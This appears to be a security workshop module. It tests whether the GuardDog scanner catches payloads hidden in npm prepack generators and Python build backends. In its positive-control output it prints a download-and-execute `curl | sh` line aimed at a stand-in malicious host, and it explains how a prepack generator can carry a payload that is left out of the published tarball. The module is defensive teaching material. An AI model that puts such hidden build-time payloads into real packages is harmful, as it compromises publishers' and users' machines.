---
id: t08-guarddog
oneliner: "A code-reading scanner meets two scenarios: one where the mechanism was excluded from the artefact, one where it ships but is benign. Both come back clean."
track: reference
---

# T08 — GuardDog / S05 + S03

## Objective

Part 2 showed that metadata-only scanners miss code that a build generates or
transforms. GuardDog reads the code itself, so it is the fair test of whether
"read the actual bytes" closes that gap. Use it to distinguish:

```text
what the artefact contains
what a code-reading heuristic can see in those contents
what a clean result actually means
```

The central question:

> When a scanner reads the code rather than the metadata, does a clean result
> mean the package is safe, or only that nothing detectable was in the bytes
> it was handed?

---

# Tooling observed

```text
guarddog 3.2.0
python  3.11.15
```

GuardDog expects a kernel-level sandbox that most laptops cannot provide. The
source-code heuristics run identically without it, so every command here
passes `--no-sandbox`. That flag lowers isolation, not detection.

---

# 1. Prove the scanner fires — the positive control

Do the control first. Every later result is a clean one, and a clean result is
only meaningful once you know the tool is awake.

## Run

```bash
./scripts/positive-control.sh
```

The script writes a deliberately malicious package (never installed, never
published) with two obvious tells: a `preinstall` hook, and an `index.js` that
base64-hides `child_process` and runs a download-and-execute.

## Observe

```text
── Initial execution ──

execution-risk: found 1 indicator
│ * threat.process.spawn
│   Detects download-and-execute patterns: fetching a remote file then executing it
│   at index.js:3
│     const cp = require(_p);
│     cp.exec("curl -s http://malicious.example.tld/payload.sh | sh");

Assessment:  High risk  (8.2/10)
```

## Establish

GuardDog resolves the base64-obscured `require`, follows it to the `exec`, and
scores the package **8.2/10**. The scanner reads code and reacts to it. From
here, a `0.0/10` means "nothing matched", not "nothing ran".

---

# 2. Scan the S05 published tarball

## Run

```bash
./scripts/scan-s05.sh
```

## Observe

The tarball a consumer actually receives contains exactly:

```text
package/dist/index.js
package/package.json
package/dist/prepack-evidence.json
```

Its `package.json` still declares the generator:

```json
"scripts": {
  "prepack": "node scripts/generate-dist.js"
}
```

GuardDog's verdict:

```text
No risks found in trace-route-package-1.0.0.tgz
Assessment:  No risks detected  (0.0/10)
```

## Establish

Read the tarball listing against the declaration. The package announces a
`prepack` step that runs `scripts/generate-dist.js`, and that file **is not in
the tarball**: S05's `files: ["dist"]` shipped the generated output and left
the generator behind. What reaches GuardDog is the *result* of a build step
plus a reference to a generator it will never see.

So the clean score is honest and useless at the same time. GuardDog flagged
nothing because there was nothing to flag: the mechanism you watched execute
in S05/T07 was packaged out of existence. This is Part 2's lesson in a new
tool: transformation destroys the evidence, and a scanner cannot report the
absence of what it cannot see.

---

# 3. Scan the S03 source distribution

## Run

```bash
./scripts/scan-s03.sh
```

## Observe

Unlike the S05 tarball, the S03 sdist carries its build logic:

```text
tracehook_demo-1.0.0/pyproject.toml
tracehook_demo-1.0.0/tracehook_backend.py
```

`pyproject.toml` names that file as the build backend:

```toml
[build-system]
requires = []
build-backend = "tracehook_backend"
backend-path = ["."]
```

GuardDog's verdict:

```text
No risks found in tracehook_demo-1.0.0.tar.gz
Assessment:  No risks detected  (0.0/10)
```

The JSON output confirms this is a real evaluation, not a skipped one: every
capability and threat rule ran and returned empty (`evidence/s03-pypi-scan.json`).

## Establish

This clean result is a different animal from Step 2. The backend that runs
during `pip install`, the code that generates the package you actually
import, is **right there in the sdist**, and GuardDog read it. It found
nothing because there is nothing: `tracehook_backend.py` builds a wheel with
`json`, `base64` and `zipfile`, which is exactly what a legitimate PEP 517
backend does. No heuristic can separate a benign build backend from a
malicious one on the strength of "it writes files during the build", because
writing files during the build is the job.

So Step 2 is clean because the evidence is absent; Step 3 is clean because the
evidence is present and genuinely benign. The score is `0.0/10` both times.

---

# 4. Make it malicious — the same mechanism, on purpose

The scans so far were of benign fixtures. This step turns S05's `prepack`
mechanism malicious, and the result is not one finding but a fork: the same
attack is caught or missed depending on one thing, where the payload sits.

The variant lives beside the scenario, in
[`scenarios/S05-node-prepack/malicious-variant`](../../scenarios/S05-node-prepack/malicious-variant/README.md).
Its payload is a harmless stand-in: an async `curl | sh` to a reserved
`.invalid` host that can never resolve. Nothing here is installed, run, or
published; it is packed and scanned, nothing more.

## Run

```bash
./scripts/scan-malicious.sh
```

Two cases, differing only in where the malicious line lives.

**Case A — the payload is in the generator.** `scripts/generate-dist.js`
carries the `curl | sh`. That code runs at `prepack`, on whoever *publishes*
the package, and `files: ["dist"]` keeps the generator out of the tarball.
Scan the published tarball:

```text
No risks found in CASE-A-generator-payload.tgz
Assessment:  No risks detected  (0.0/10)
```

Clean. Now scan the *source*, where the generator still exists:

```text
execution-risk: found 1 indicator
│ * threat.process.spawn
│   Detects download-and-execute patterns: fetching a remote file then executing it
│   at scripts/generate-dist.js:9
Assessment:  High risk  (8.2/10)
```

Same package, opposite verdicts. The attack is real and GuardDog can see it,
but only from the source. Publishing packaged the evidence out, exactly as the
benign S05 tarball did in Step 2. And note who this attack even targets: it
runs at pack time, so its victim is the *build machine*, and the artefact a
consumer downloads carries no sign of it at all.

**Case B — the payload is in the generated output.** Here the generator is
unremarkable, but it *writes* the `curl | sh` into `dist/index.js`. That file
ships. Scan the published tarball:

```text
execution-risk: found 1 indicator
│ * threat.process.spawn
│   Detects download-and-execute patterns: fetching a remote file then executing it
│   at package/dist/index.js:4
Assessment:  High risk  (8.2/10)
```

Caught. The payload rode into the shipped `dist/` and now targets the
*consumer*, and because it survived into the artefact, a scan of the artefact
finds it.

## Establish

One mechanism, two attacks, one discriminator:

```text
payload in generator   → runs at pack time, hits the PUBLISHER,  absent from tarball  → tarball scan MISSES
payload in generated   → runs on load,      hits the CONSUMER,   present in tarball   → tarball scan CATCHES
```

Scanning the published artefact is exactly the right move for the
consumer-facing attack and completely blind to the publisher-facing one. The
prepack mechanism lets the attacker choose which, and the tarball only ever
carries evidence of one of them.

---

# 5. The boundary

Line the results up:

```text
positive control        High risk 8.2   mechanism present AND matches a pattern
malicious A, source     High risk 8.2   generator present — caught
malicious B, tarball    High risk 8.2   payload shipped in dist — caught
malicious A, tarball    clean 0.0       generator excluded from tarball — missed
S03 sdist               clean 0.0       mechanism present, benign, correctly cleared
S05 tarball             clean 0.0       mechanism absent, nothing to judge
```

A code-reading scanner is a real step up from a metadata one: three of these
malicious and benign packages get exactly the verdict they deserve. But look
at the two `clean 0.0` rows against the caught ones. A single clean number
covers "benign", "nothing shipped here", and "the attack is in the half we
didn't scan". Only the artefact contents, read alongside the score, tell you
which clean you are holding.

One more limit, stated plainly: GuardDog has no Java ecosystem, so it cannot
scan S04's Maven JAR at all. The hidden-endpoint mechanism from S04 is outside
its reach not because the evidence is missing but because the language is.
Every tool has a boundary; this workshop's whole method is knowing which
boundary you are standing on.

---

# What this proves

```text
reading code beats reading metadata
a clean result still is not a safety proof
"no risk detected" can mean absent evidence OR benign evidence
```

# What this does NOT prove

That GuardDog is weak. It earned every verdict: it flagged the malicious
control, caught the malicious variant wherever the payload actually shipped,
and declined to invent findings in packages that had none. The gap is
structural, the same one every part of this workshop keeps meeting: a tool
answers for the evidence at its own boundary, and a score is not the same
thing as the truth behind it.

---

# Run

```bash
./scripts/positive-control.sh   # High risk — the scanner is awake
./scripts/scan-s05.sh           # clean — benign mechanism excluded from the tarball
./scripts/scan-s03.sh           # clean — benign backend present
./scripts/scan-malicious.sh     # catch vs miss — same attack, two hiding places
./scripts/proof-check.sh
```
